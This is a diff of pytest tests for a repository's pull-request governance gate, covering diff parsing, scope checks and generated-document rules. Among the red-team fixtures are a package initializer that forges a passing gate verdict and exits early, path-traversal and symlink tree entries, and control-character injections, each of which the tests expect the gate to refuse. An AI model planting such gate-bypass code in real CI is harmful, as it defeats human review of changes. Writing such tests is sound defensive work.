+        (full[:2] + ("Cost: $0.01", "## Later", "Wall-clock: 2 s"), "leaves Wall-clock blank"),
+        (("cost: $0.01",) + full, "leaves Cost blank"),
+    )
+    for lines, reason in refused:
+        r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=cost_capacity(*lines))
+        assert r.returncode == 1 and reason in r.stdout, (lines, r.stdout + r.stderr)
+    passing = (
+        full + ("Cost: ~$0.02",),
+        full + ("Cost: <$1/month",),
+        full + ("Cost: about one dollar a month",),
+        full + ("**Cost:** $0.01",),
+        ("n/a: nothing runs differently",),
+        ("<p>", "", "Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: $0.01", "", "</p>"),
+    )
+    for lines in passing:
+        r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=cost_capacity(*lines))
+        assert r.returncode == 0, (lines, r.stdout + r.stderr)
+    # a change with no workload needs no Cost; a workflow is a workload like gcp/
+    assert pr(repo, BRANCH, CODE, **COST_TITLE, PR_BODY=cost_capacity(*full)).returncode == 0
+    r = pr(repo, BRANCH, {**CODE, ".github/workflows/job.yml": "name: job\n"}, **COST_TITLE, PR_BODY=cost_capacity(*full))
+    assert r.returncode == 1 and "leaves Cost blank" in r.stdout, r.stdout + r.stderr
 
 
 def test_chained_exits_quoted_hashes_and_headings_beside_rows_are_the_contract(repo):
@@ -3739,3 +4428,2106 @@ def test_chained_exits_quoted_hashes_and_headings_beside_rows_are_the_contract(r
     with_heading = row_only + f"\n### FEAT-MODEL-001\n\n- Status: Production\n- Last reviewed: {TODAY}\n- PRs: #42\n"
     r = pr(repo, BRANCH, {**job, CATALOG: with_heading}, **title, PR_BODY=body(ticked=True) + "\n\n## Capacity\nn/a: x\n")
     assert r.returncode == 1 and "adds a second heading or row" in r.stdout, r.stdout
+
+
+def test_root_namespace_application_stays_owned_by_its_actual_feature(repo):
+    catalog = CATALOG_TEXT.replace('| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |',
+                                   '| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n| FEAT-CICD-001 | Delivery | Production | unknown | none |')
+    on_base(repo, {CATALOG: catalog})
+    accepted = pr(repo, BRANCH, {'platform/api/ordinary.py': 'VALUE = 1\n'},
+                  PR_TITLE='FEAT-MODEL-001: namespace application input', PR_DRAFT='true')
+    assert accepted.returncode == 0, accepted.stdout + accepted.stderr
+    refused = pr(repo, BRANCH, {'platform/__init__.py': '# regular package transition\n'},
+                 PR_TITLE='FEAT-MODEL-001: effective package transition', PR_DRAFT='true')
+    assert refused.returncode == 1 and 'belong to FEAT-CICD-001' in refused.stdout
+
+
+def test_existing_root_regular_package_child_is_process_input_on_both_sides(repo):
+    catalog = CATALOG_TEXT.replace('| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |',
+                                   '| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n| FEAT-CICD-001 | Delivery | Production | unknown | none |')
+    on_base(repo, {CATALOG: catalog, 'json/__init__.py': '# actual regular package\n',
+                   'json/decoder.py': 'VALUE = 1\n'})
+    refused = pr(repo, BRANCH, {'json/decoder.py': 'VALUE = 2\n'},
+                 PR_TITLE='FEAT-MODEL-001: transitive startup input', PR_DRAFT='true')
+    assert refused.returncode == 1 and 'belong to FEAT-CICD-001' in refused.stdout
+    removed = pr(repo, BRANCH, {'json/__init__.py': None, 'json/decoder.py': 'VALUE = 3\n'},
+                 PR_TITLE='FEAT-MODEL-001: package removal remains process input', PR_DRAFT='true')
+    assert removed.returncode == 1 and 'belong to FEAT-CICD-001' in removed.stdout
+
+
+# REQ-GOV-004 byte-scope acceptance, attributed core fd178/9ee; current governance retained.
+
+def load_gate(root: Path) -> types.ModuleType:
+    """root's copy of the gate as a module of its own: its ROOT is root, so its git calls read that repository.
+    Registered in sys.modules, where dataclasses look their module up."""
+    n = 0
+    while f"spec_gate_under_test_{n}" in sys.modules:
+        n += 1
+    name = f"spec_gate_under_test_{n}"
+    found = importlib.util.spec_from_file_location(name, root / "scripts/gate/spec_gate.py")
+    module = importlib.util.module_from_spec(found)
+    sys.modules[name] = module
+    found.loader.exec_module(module)
+    return module
+
+def base_and_head(repo: Path) -> tuple[str, str]:
+    base, head = _git(repo, "rev-parse", "base", "HEAD").splitlines()
+    return base, head
+
+def test_changed_lines_reads_the_diff_as_bytes(repo):
+    """FEAT-CICD-001 spec, the diff reader (done_when[2]).
+
+    Main's reader took a content line beginning with `---` or `+++` for a file header and split text-mode output at a
+    lone carriage return and at U+2028: the first diff read as [], the second as five lines that git never wrote.
+    """
+    sg = load_gate(repo)
+    on_base(repo, {"docs/f.md": "a\n---\n-- keep\nb\nc\nd\n"})
+    pr(repo, "docs/probe", {"docs/f.md": "a\n+++ added\n++ also\nb\nc\nd\n"})
+    assert sg.changed_lines(*base_and_head(repo), "docs/f.md") == [("-", 2, "---"), ("-", 3, "-- keep"), ("+", 2, "+++ added"), ("+", 3, "++ also")]
+    on_base(repo, {"docs/f.md": "a\nb\nc\nd\ne\nf\n"})
+    pr(repo, "docs/probe", {"docs/f.md": "a\nb-new\r+phantom\nc\nd\ne-new\u2028@@ -9 +9 @@\nf\n"})
+    assert sg.changed_lines(*base_and_head(repo), "docs/f.md") == [("-", 2, "b"), ("+", 2, "b-new\r+phantom"), ("-", 5, "e"), ("+", 5, "e-new\u2028@@ -9 +9 @@")]
+    # (red-team round 1: context lines that git's config adds between hunks, blank ones printed empty, are counted)
+    on_base(repo, {"docs/f.md": "a\nb\n\nc\nd\ne\n"})
+    pr(repo, "docs/probe", {"docs/f.md": "a\nB\n\nc\nd\nE\n"})
+    _git(repo, "config", "diff.interHunkContext", "5")
+    _git(repo, "config", "diff.suppressBlankEmpty", "true")
+    assert sg.changed_lines(*base_and_head(repo), "docs/f.md") == [("-", 2, "b"), ("+", 2, "B"), ("-", 6, "e"), ("+", 6, "E")]
+
+def test_changed_lines_raises_on_a_binary_or_hunkless_diff(repo):
+    """FEAT-CICD-001 spec, the diff reader (done_when[2]).
+
+    A NUL makes git print "Binary files differ" and a mode change prints no hunk: main's reader returned no lines for a
+    path it was asked about, which the catalog scope check read as nothing changed.
+    """
+    sg = load_gate(repo)
+    on_base(repo, {"docs/f.md": "a\n"})
+    pr(repo, "docs/probe", {"docs/f.md": "a\x00\n"})                                  # binary
+    with pytest.raises(sg.GitFailed, match="no text hunk"):
+        sg.changed_lines(*base_and_head(repo), "docs/f.md")
+    pr(repo, "docs/probe", {}, then=lambda r: (r / "docs/f.md").chmod(0o755))         # mode only
+    with pytest.raises(sg.GitFailed, match="no text hunk"):
+        sg.changed_lines(*base_and_head(repo), "docs/f.md")
+
+def test_added_lines_is_gone():
+    """FEAT-CICD-001 spec, the diff reader (done_when[2]): added_lines had no caller and read the diff as main's
+    changed_lines did."""
+    defined = {n.name for n in ast.parse(GATE.read_text(encoding="utf-8")).body if isinstance(n, ast.FunctionDef)}
+    assert "changed_lines" in defined and "added_lines" not in defined
+
+def test_feat_span_and_section_of_number_lines_as_git_does(repo):
+    """FEAT-CICD-001 spec, the diff reader (done_when[2]): git numbers lines by "\\n" alone. Main split decoded text
+    with splitlines(), which also breaks at U+2028 and a lone carriage return, so its line numbers ran ahead of git's."""
+    sg = load_gate(repo)
+    assert sg.feat_span("### FEAT-A-001\nx y\n### FEAT-B-001\nz\n", "FEAT-A-001") == {1, 2}      # main: {1, 2, 3}
+    assert sg.section_of("### FEAT-A-001\nx\ry\n### FEAT-B-001\n", "FEAT-A-001") == range(1, 3)    # main: range(1, 4)
+
+def test_the_catalog_scope_check_sees_every_changed_line(repo):
+    """FEAT-CICD-001 spec, the diff reader (done_when[2]).
+
+    Each case is an edit to FEAT-DATA-001's record by the FEAT-MODEL-001 branch that main's gate passed (measured):
+    the reader dropped the line, or numbered it inside the branch's own record.
+    """
+    own = "### FEAT-MODEL-001\n\n- Status: Production"
+    added = "### FEAT-DATA-001\nAdded by a FEAT-MODEL-001 branch.\nAnd a second line.\n"
+    ok = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body()}
+    outcomes = {}
+    on_base(repo, {CATALOG: CATALOG_TEXT + "\n---\n\n-- keep this caveat\n"})
+    outcomes["a removed '---' line"] = pr(repo, BRANCH, {**CODE, CATALOG: CATALOG_TEXT + "\n\n\n-- keep this caveat\n"}, **ok)
+    on_base(repo, {CATALOG: CATALOG_TEXT})
+    outcomes["a NUL in the own Status"] = pr(repo, BRANCH, {**CODE, CATALOG: CATALOG_TEXT.replace(own, own + "\x00").replace(
+        "### FEAT-DATA-001\n\n- Status: Production", "### FEAT-DATA-001\n\n- Status: Retired")}, **ok)
+    outcomes["U+2028 in the own record"] = pr(repo, BRANCH, {**CODE, CATALOG: CATALOG_TEXT.replace(own, own + " " * 4).replace("### FEAT-DATA-001\n", added)}, **ok)
+    outcomes["lone CRs in the own record"] = pr(repo, BRANCH, {**CODE, CATALOG: CATALOG_TEXT.replace(own, own + "\r" * 4).replace("### FEAT-DATA-001\n", added)}, **ok)
+    # (red-team round 1: with diff.interHunkContext in the config git reads, main numbered the second hunk inside the own record)
+    _git(repo, "config", "diff.interHunkContext", "5")
+    outcomes["context lines from git's config"] = pr(repo, BRANCH, {**CODE, CATALOG: CATALOG_TEXT.replace(own, own + "\n- Note: mine").replace(
+        "### FEAT-DATA-001\n\n- Status: Production", "### FEAT-DATA-001\n\n- Status: Retired")}, **ok)
+    _git(repo, "config", "--unset", "diff.interHunkContext")
+    missed = {k: r.stdout[-300:] for k, r in outcomes.items() if r.returncode != 1
+              or not ("lines outside FEAT-MODEL-001's row and record change" in r.stdout or "no text hunk" in r.stdout)}
+    assert missed == {}, missed
+
+
+def change(repo: Path, branch: str, files: dict[str, str | None], then: Callable[[Path], object] | None = None) -> None:
+    """Commit, on `branch` cut from base, `files` (None deletes one), after `then(repo)` if given."""
+    _git(repo, "clean", "-qfd")
+    _git(repo, "checkout", "-f", "-q", "-B", branch, "base")
+    for path, text in files.items():
+        if text is None:
+            (repo / path).unlink()
+        else:
+            write(repo, path, text)
+    if then is not None:
+        then(repo)
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", f"change on {branch}")
+
+def test_the_renderer_and_its_snapshot_are_process_files(repo):
+    """FEAT-CICD-001 spec, is_process_file (done_when[4]): the gate now trusts the renderer, its package and its
+    snapshot to decide a verdict, so a change to them is FEAT-CICD-001's work, as the gate's own files are."""
+    cicd_row = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]", 1)
+    on_base(repo, {CATALOG: cicd_row})
+    paths = ("scripts/__init__.py", "scripts/maintenance/doc_inventory.py", "scripts/maintenance/check_generated_docs.py",
+             "scripts/maintenance/__init__.py", "tests/fixtures/live_gcp_snapshot_2026-09-07.json")
+    missed = [p for p in paths if "belong to FEAT-CICD-001" not in
+              pr(repo, BRANCH, {**CODE, p: "# x\n"}, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body()).stdout]
+    assert missed == [], missed
+
+
+def test_the_gate_names_the_documents_and_snapshot_the_docs_test_reads():
+    """FEAT-CICD-001 spec, parity (done_when[3]): the gate's three document paths are the renderer's MARKER_DOCS
+    and its snapshot is the docs test's SNAPSHOT, so the gate checks what the docs test checks."""
+    sg = load_gate(REPO)
+    assert sg.GENERATED_RULE == "REQ-GOV-004" and sg.RENDER_INPUTS == (
+        "scripts/__init__.py", "scripts/maintenance/__init__.py",
+        "scripts/maintenance/doc_inventory.py", "scripts/maintenance/check_generated_docs.py",
+        "tests/scripts/test_check_generated_docs.py", "tests/fixtures/live_gcp_snapshot_2026-09-07.json")
+    # the renderer tests cannot be switched off in a repository that carries the documents
+    assert RENDERER_HERE == all((REPO / d).is_file() for d in sg.GENERATED_DOCS)
+    if RENDERER_HERE:
+        from scripts.maintenance import check_generated_docs as cgd
+        from tests.scripts.test_check_generated_docs import SNAPSHOT
+        assert sg.GENERATED_DOCS == cgd.MARKER_DOCS and REPO / sg.RENDER_SNAPSHOT == SNAPSHOT
+
+
+# The generated documents: a fixture tree holding scripts/maintenance/, the snapshot and only the files the three
+# documents' blocks render from, rendered once per session (inventory_template) and copied per test.
+INFRA = "docs/product/infrastructure"
+GENERATED = (f"{INFRA}/05-a-ARCHITECTURE.md", f"{INFRA}/05-c-DATA_DEPENDENCIES.md", f"{INFRA}/05-e-API.md")
+API_DOC = GENERATED[2]
+SNAPSHOT_FILE = "tests/fixtures/live_gcp_snapshot_2026-09-07.json"
+MAIN_PY = "platform/api/main.py"
+RENDER_TREE = ("scripts/maintenance/__init__.py", "scripts/maintenance/doc_inventory.py", "scripts/maintenance/check_generated_docs.py",
+               SNAPSHOT_FILE, MAIN_PY, "gcp/deploy.sh", "gcp/schema.sql", "scripts/discord/register_commands.py")
+# Representative SOURCE input, not mocked renderer output. The same four source
+# paths exercise real route/deploy/schema/command parsing and line citations.
+# Full production-tree rendering is measured separately; copying its entire ASTs
+# into every adversarial fixture needlessly multiplied test I/O/render time.
+RENDER_SOURCE = {
+    MAIN_PY: '"""Representative API.\n\nInventory fixture.\n"""\nfrom fastapi import FastAPI\nfrom gcp.database import query_to_dataframe\napp = FastAPI()\n\n@app.get("/health")\ndef health_check():\n    """Liveness probe: reports service health."""\n    return {"status": "ok"}\n\n@app.get("/api/daily")\ndef daily_rows():\n    """Read retained daily observations."""\n    return query_to_dataframe("SELECT close FROM market_data_daily")\n',
+    "gcp/deploy.sh": '#!/bin/bash\ndeploy_probe() {\n    gcloud run jobs deploy inventory-probe \\\n        --command python3 \\\n        --args gcp/probe.py\n}\n',
+    "gcp/schema.sql": "CREATE TABLE market_data_daily (\n    ticker TEXT NOT NULL,\n    date DATE NOT NULL,\n    close DOUBLE PRECISION,\n    volume BIGINT,\n    PRIMARY KEY (ticker, date)\n);\n",
+    "scripts/discord/register_commands.py": 'SUB_COMMAND = 1\nCOMMANDS = [{"name": "probe", "description": "Inventory probe", "options": []}]\n',
+}
+TRACE_TEXT = "# Traceability\n\n### FEAT-MODEL-001\n\n- #1\n"
+RULE = "REQ-GOV-004"
+DOCS_OK = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body() + "\n\n## Capacity\nn/a: x\n"}
+
+
+def skeleton(doc: str) -> str:
+    """doc with prose around every block the docs test expects in it, each block empty until rendered."""
+    from scripts.maintenance.check_generated_docs import EXPECTED_MARKERS   # stocks only: called where RENDERER_HERE
+    from scripts.maintenance.doc_inventory import MARKER_END, MARKER_START
+    parts = [f"# {Path(doc).stem}", "Prose before the blocks."]
+    for name in EXPECTED_MARKERS[doc]:
+        parts += [f"{MARKER_START.format(name=name)}\n\n{MARKER_END.format(name=name)}", f"Prose after {name}."]
+    return "\n\n".join(parts) + "\n"
+
+
+def render(root: Path, docs: tuple[str, ...] = GENERATED) -> None:
+    """Re-render docs' blocks in root's working tree with root's renderer, as a person re-renders them.
+    -B: a __pycache__ would otherwise be committed by `git add -A`."""
+    subprocess.run([sys.executable, "-B", "-m", "scripts.maintenance.doc_inventory", "--root", ".", "--snapshot", SNAPSHOT_FILE,
+                    "--insert", *docs], cwd=root, check=True)
+
+
+def moved_main() -> str:
+    """Fixture platform/api/main.py with four lines added after its docstring: every line the documents cite below
+    them moves, as stocks#1366 moved them."""
+    lines = RENDER_SOURCE[MAIN_PY].split("\n")
+    return "\n".join(lines[:4] + ["# moved by four lines, as stocks#1366 moved them", "# two", "# three", "# four"] + lines[4:])
+
+
+def edit(text: str, old: str, new: str) -> str:
+    """text with its first `old` replaced, which must be there: a case cannot silently become its control."""
+    assert old in text, old
+    return text.replace(old, new, 1)
+
+
+def refused(r: subprocess.CompletedProcess, fragment: str) -> bool:
+    return r.returncode == 1 and RULE in r.stdout and fragment in r.stdout
+
+
+@pytest.fixture(scope="session")
+def inventory_template(tmp_path_factory) -> tuple[Path, dict[str, str]] | None:
+    """make_repo plus RENDER_TREE from REPO and the three documents rendered over it, as `base`; and `moved`, the
+    files a change that moves main.py's cited lines carries: main.py and the three documents re-rendered. The render
+    runs in this whole repository, because lib/ and scripts/gate/ change its modules and table-reference blocks."""
+    if not RENDERER_HERE:
+        return None
+    root = make_repo(tmp_path_factory.mktemp("inventory"))
+    files = {p: RENDER_SOURCE[p] if p in RENDER_SOURCE else (REPO / p).read_bytes().decode("utf-8")
+             for p in RENDER_TREE}
+    on_base(root, {**files, **{d: skeleton(d) for d in GENERATED}, TRACEABILITY: TRACE_TEXT}, then=render)
+    _git(root, "checkout", "-q", "-b", "moved", "base")
+    write(root, MAIN_PY, moved_main())
+    render(root)
+    moved = {p: (root / p).read_bytes().decode("utf-8") for p in (MAIN_PY, *GENERATED)}
+    _git(root, "checkout", "-q", "-f", "main")
+    _git(root, "branch", "-q", "-D", "moved")
+    return root, moved
+
+
+@pytest.fixture
+def inventory_repo(inventory_template, tmp_path) -> tuple[Path, dict[str, str]] | None:
+    """A copy of inventory_template for one test, which may move its base."""
+    if inventory_template is None:
+        return None
+    template, moved = inventory_template
+    root = tmp_path / "repo"
+    shutil.copytree(template, root, symlinks=True)
+    return root, dict(moved)
+
+
+def test_the_gate_imports_the_renderer_only_for_a_generated_document(inventory_repo):
+    """FEAT-CICD-001 spec, the allowance (done_when[3]): the gate imports scripts/maintenance only when one of the
+    three documents changes, so every other pull request is judged without it."""
+    if RENDERER_HERE:
+        root, moved = inventory_repo
+        on_base(root, {"scripts/maintenance/doc_inventory.py": 'raise RuntimeError("doc_inventory imported")\n'})
+        code_only = pr(root, BRANCH, CODE, **DOCS_OK)
+        with_docs = pr(root, BRANCH, {**CODE, API_DOC: moved[API_DOC]}, **DOCS_OK)
+        assert (code_only.returncode, with_docs.returncode != 0, "doc_inventory imported" in with_docs.stderr) == (0, True, True), \
+            code_only.stdout + with_docs.stdout + with_docs.stderr
+
+
+def test_a_checkout_without_the_renderer_refuses_generated_documents_as_before(repo):
+    """FEAT-CICD-001 spec, the allowance (done_when[3]): a checkout without scripts/maintenance/ (solyra's, and this
+    suite's plain repo) gives no allowance and refuses a generated document as main does, without failing."""
+    r = pr(repo, BRANCH, {**CODE, "docs/product/infrastructure/05-e-API.md": "# API\n"}, **DOCS_OK)
+    assert r.returncode == 1 and "05-e-API.md changes in this feature change" in r.stdout and RULE in r.stdout \
+        and "Traceback" not in r.stderr, r.stdout + r.stderr
+
+
+def test_parent_renderer_initializer_cannot_enter_main_via_a_feature(inventory_repo):
+    """Real BASE-checkout first-stage refusal closes the later startup-verdict bypass."""
+    if RENDERER_HERE:
+        root, moved = inventory_repo
+        sentinel = root / "UNTRUSTED_PACKAGE_EXECUTED"
+        cicd_row = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]", 1)
+        on_base(root, {CATALOG: cicd_row})
+        initializer = (
+            "import os, sys\n"
+            "if '--pr' in sys.argv:\n"
+            f"    open({str(sentinel)!r}, 'w').write('executed')\n"
+            "    print('spec gate ok: forged by package startup', flush=True)\n"
+            "    os._exit(0)\n"
+        )
+        change(root, BRANCH, {**moved, "scripts/__init__.py": initializer})
+        base, head = base_and_head(root)
+        _git(root, "checkout", "-q", "-f", "main")
+        attempted = gate(root, "--pr", base, head, PR_HEAD_REF=BRANCH, **DOCS_OK)
+        assert attempted.returncode == 1 and "belong to FEAT-CICD-001" in attempted.stdout, attempted.stdout
+        assert RULE in attempted.stdout and "which decide the render" in attempted.stdout, attempted.stdout
+        assert not sentinel.exists(), "HEAD initializer executed before a trusted verdict"
+        # The refused first stage cannot become BASE. From the unchanged real
+        # BASE, the otherwise IDENTICAL generated movement is still accepted.
+        change(root, BRANCH, moved)
+        base, head = base_and_head(root)
+        _git(root, "checkout", "-q", "-f", "main")
+        clean = gate(root, "--pr", base, head, PR_HEAD_REF=BRANCH, **DOCS_OK)
+        assert clean.returncode == 0, clean.stdout + clean.stderr
+        assert not sentinel.exists()
+
+
+def test_the_refusal_names_the_inventory_allowance(repo):
+    """FEAT-CICD-001 spec, the allowance (done_when[7]): the refusal for every other docs/product/ path names the
+    re-rendered inventory blocks as an allowed change and cites REQ-GOV-004."""
+    r = pr(repo, BRANCH, {**CODE, "docs/product/13-ROADMAP.md": "# Roadmap\n"}, **DOCS_OK)
+    assert r.returncode == 1 and "13-ROADMAP.md changes in this feature change" in r.stdout \
+        and "re-rendered by scripts/maintenance/doc_inventory.py (REQ-GOV-004)" in r.stdout, r.stdout
+    assert "existing fixed renderer-owned count/as-of substitutions" in r.stdout, r.stdout
+    assert all(name in r.stdout for name in ('05-a-ARCHITECTURE.md', '05-c-DATA_DEPENDENCIES.md', '05-e-API.md')), r.stdout
+
+
+def test_render_inputs_and_the_documents_themselves_stay_put(inventory_repo):
+    """FEAT-CICD-001 spec, "Render inputs unchanged" and "Same file" (done_when[1]): each case differs from the
+    #1366-shaped head (moved) in one condition, and each is refused citing REQ-GOV-004."""
+    if RENDERER_HERE:
+        root, moved = inventory_repo
+        inputs, same = "which decide the render", "is deleted, renamed or changes file mode"
+        cases = {   # name: (files, then, fragment); each differs from the #1366 head in one condition
+            "parent scripts initializer changes": ({**moved, "scripts/__init__.py": "# touched\n"}, None, inputs),
+            "maintenance initializer changes": ({**moved, "scripts/maintenance/__init__.py": "# touched\n"}, None, inputs),
+            "doc_inventory.py changes": ({**moved, "scripts/maintenance/doc_inventory.py": (REPO / "scripts/maintenance/doc_inventory.py").read_text(encoding="utf-8") + "# touched\n"}, None, inputs),
+            "check_generated_docs.py changes": ({**moved, "scripts/maintenance/check_generated_docs.py": (REPO / "scripts/maintenance/check_generated_docs.py").read_text(encoding="utf-8") + "# touched\n"}, None, inputs),
+            "the docs test changes": ({**moved, "tests/scripts/test_check_generated_docs.py": "# touched\n"}, None, inputs),
+            "the snapshot changes": ({**moved, SNAPSHOT_FILE: (REPO / SNAPSHOT_FILE).read_text(encoding="utf-8") + "\n"}, None, inputs),
+            "05-e deleted": ({**moved, API_DOC: None}, None, same),
+            "05-e renamed": ({**moved, API_DOC: None, f"{INFRA}/05-e-API-v2.md": moved[API_DOC]}, None, same),
+            "05-e made executable": (moved, lambda r: (r / API_DOC).chmod(0o755), same),
+        }
+        outcomes = {k: pr(root, BRANCH, f, then=t, **DOCS_OK) for k, (f, t, _) in cases.items()}
+        missed = {k: r.stdout[-400:] for k, r in outcomes.items() if not refused(r, cases[k][2])}
+        assert missed == {}, missed
+
+
+def test_only_inventory_block_bodies_change(inventory_repo):
+    """FEAT-CICD-001 spec, "Exact markers" and "Only block bodies change" (done_when[1]): with every block body set
+    aside, 05-e must equal main's byte for byte, on exact marker lines in main's order. Each case is the #1366 head
+    with one change, and each is refused citing REQ-GOV-004 and naming its condition."""
+    if RENDERER_HERE:
+        root, moved = inventory_repo
+        t = moved[API_DOC]
+        rs, re_, ts = "<!-- inventory:routes:start -->", "<!-- inventory:routes:end -->", "<!-- inventory:routers:start -->"
+        routers = t[t.index(ts):t.index("<!-- inventory:routers:end -->") + len("<!-- inventory:routers:end -->\n")]
+        routes = t[t.index(rs):t.index(re_) + len(re_) + 1]
+        n = t.split("\n").index("Prose after routes.") + 1
+        first_body = t.index("\n", t.index(rs) + len(rs) + 1)          # the newline ending the routes block's first body line
+        cases = {
+            "a byte outside the blocks": (edit(t, "Prose after routes.", "Prose after routes!"), f"changes line {n} outside its inventory blocks"),
+            "CRLF throughout": (t.replace("\n", "\r\n"), "carriage return"),
+            "a CRLF inside a block body": (t[:first_body] + "\r" + t[first_body:], "carriage return"),
+            "a marker added": (t + re_ + "\n", "marker lines"),
+            "a marker removed": (edit(t, "<!-- inventory:routers:end -->\n", ""), "marker lines"),
+            "a block moved": (edit(t.replace(routes, ""), ts, routes + ts), "marker lines"),
+            "a marker renamed": (t.replace("inventory:routes:", "inventory:paths:"), "marker lines"),
+            "a marker re-spaced": (edit(t, rs, "<!--  inventory:routes:start -->"), "marker lines"),
+            "a block repeated": (edit(t, routers, routers + routers), "marker lines"),
+            "a name 05-e does not carry": (edit(t, "Prose after routes.", "Prose after routes.\n<!-- inventory:jobs:start -->"), "marker lines"),
+        }
+        outcomes = {k: pr(root, BRANCH, {**moved, API_DOC: text}, **DOCS_OK) for k, (text, _) in cases.items()}
+        missed = {k: r.stdout[-400:] for k, r in outcomes.items() if not refused(r, cases[k][1])}
+        assert missed == {}, missed
+
+
+# A route whose path holds an escape sequence written as source text: main's renderer renders each escape into one
+# 05-a and two 05-e block lines (verified 2026-10-11), so the bytes come from the fixture tree's own rendered text.
+ROUTE = '\n\n@app.get("/api/zz{}")\ndef zz_probe():\n    """Probe."""\n    return {{}}\n'
+
+
+def test_a_block_carries_only_bytes_the_docs_test_sees(inventory_repo):
+    """FEAT-CICD-001 spec, "Clean bytes" (done_when[1]): the docs test reads with read_text(), so a NUL, U+0085,
+    U+2028 or U+2029 inside a block body passes it unseen. Rendered from the route path, so only this rule refuses."""
+    if RENDERER_HERE:
+        root, moved = inventory_repo
+        outcomes = {esc: pr(root, BRANCH, {MAIN_PY: moved_main() + ROUTE.format(esc)}, then=render, **DOCS_OK)
+                    for esc in ("\\x00", "\\x85", "\\u2028", "\\u2029")}   # rendered from the route path, so only this rule refuses
+        missed = {k: r.stdout[-400:] for k, r in outcomes.items() if not refused(r, "carries a carriage return, NUL, U+0085, U+2028 or U+2029")}
+        assert missed == {}, missed
+
+
+def mktree(root: Path, lines: str) -> str:
+    """The id of the tree `git mktree` builds from ls-tree-format `lines`."""
+    return subprocess.run(["git", "mktree"], input=lines, cwd=root, capture_output=True, text=True, check=True).stdout.strip()
+
+
+def spliced(root: Path, entry: str) -> tuple[str, str]:
+    """(base, head) rebuilt with one more root entry, `vendor`, a tree made from the single ls-tree line `entry`, in
+    both commits. The head commit is parented on the base, so the entry sits in the head tree and never in the diff.
+    Called after pr(), on its HEAD."""
+    vendor = mktree(root, entry + "\n")
+    shas: list[str] = []
+    for rev in ("base", "HEAD"):
+        tree = mktree(root, _git(root, "ls-tree", f"{rev}^{{tree}}") + f"\n040000 tree {vendor}\tvendor\n")
+        parent = shas[-1] if shas else _git(root, "rev-parse", "base")
+        shas.append(_git(root, "commit-tree", tree, "-p", parent, "-m", f"{rev} with vendor"))
+    return shas[0], shas[1]
+
+
+def test_the_head_tree_is_plain_files(inventory_repo):
+    """FEAT-CICD-001 spec, "Exact render", the tree (done_when[1]): the render reads the head tree written out as plain
+    files, so a .gitattributes that changes bytes on export, a symbolic link, a submodule and a path component that
+    is empty, '.', '..' or '.git' (in any case) are each refused before anything is written."""
+    if RENDERER_HERE:
+        root, moved = inventory_repo
+        outcomes = {f".gitattributes {a}": (pr(root, BRANCH, {**moved, ".gitattributes": f"{API_DOC} {a}\n"}, **DOCS_OK), "a .gitattributes")
+                    for a in ("export-subst", "eol=crlf", "ident")}
+        blob = subprocess.run(["git", "hash-object", "-w", "--stdin"], input="../gcp/schema.sql", cwd=root, capture_output=True, text=True, check=True).stdout.strip()
+        x = mktree(root, f"100644 blob {blob}\tx\n")
+        entries = {"a symbolic link": (f"120000 blob {blob}\tlink", "a symbolic link"),
+                   "a submodule": (f"160000 commit {_git(root, 'rev-parse', 'base')}\tsub", "a submodule"),
+                   "an empty component": (f"040000 tree {x}\t", "cannot be listed"),
+                   **{f"component {c}": (f"040000 tree {x}\t{c}", "a path component") for c in (".", "..", ".git", ".GIT")},
+                   # (red-team round 1: a name the filesystem cannot hold crashed the gate with a traceback)
+                   "a 256-byte name": (f"100644 blob {blob}\t{'x' * 256}", "cannot be written out")}
+        change(root, BRANCH, moved)   # the #1366 head, which each splice extends
+        for name, (entry, fragment) in entries.items():
+            b, h = spliced(root, entry)
+            outcomes[name] = (gate(root, "--pr", b, h, PR_HEAD_REF=BRANCH, **DOCS_OK), fragment)
+        missed = {k: r.stdout[-400:] for k, (r, fragment) in outcomes.items() if not refused(r, fragment)}
+        assert missed == {}, missed
+
+
+def test_materialize_writes_inside_its_directory_only(repo, tmp_path_factory):
+    """FEAT-CICD-001 spec, "Exact render" (done_when[1]): every resolved path stays inside the directory before it is
+    written, and each blob is written byte for byte."""
+    sg = load_gate(repo)
+    oid, out = _git(repo, "rev-parse", "base:lib/model.py"), tmp_path_factory.mktemp("tree")
+    with pytest.raises(ValueError, match="outside"):
+        sg.materialize([("100644", oid, "../escape.py")], out)
+    sg.materialize([("100644", oid, "lib/model.py")], out)
+    assert (out / "lib/model.py").read_bytes() == b"DECISION = 'size'\n" and not (out.parent / "escape.py").exists()
+
+
+# A deploy.sh job whose --args names its entrypoint: the renderer reads that file's first docstring line. Verified on
+# 2026-10-11: with an absolute path the fence exits 86, and with gcp/evil_job.py the render opens nothing outside.
+JOB = "\ndeploy_evil_job() {{\n    gcloud run jobs deploy evil-job \\\n        --command python3 \\\n        --args {}\n}}\n"
+
+
+def test_a_feature_change_carries_its_re_rendered_inventory_blocks(inventory_repo):
+    """FEAT-CICD-001 spec, the allowance (done_when[0]): a feature branch that adds four lines near the top of
+    platform/api/main.py, as stocks#1366 did, passes the PR-mode gate carrying the three documents' re-rendered
+    blocks and its own catalog and traceability records."""
+    if RENDERER_HERE:
+        root, moved = inventory_repo
+        own = edit(CATALOG_TEXT, "### FEAT-MODEL-001\n\n- Status: Production", "### FEAT-MODEL-001\n\n- Status: Production\n- Note: cited lines moved")
+        r = pr(root, BRANCH, {**moved, CATALOG: own, TRACEABILITY: TRACE_TEXT + "- #7\n"}, **DOCS_OK)
+        changed = set(_git(root, "diff", "--name-only", "base", "HEAD").splitlines())
+        assert r.returncode == 0 and changed == {MAIN_PY, *GENERATED, CATALOG, TRACEABILITY}, r.stdout + r.stderr
+
+
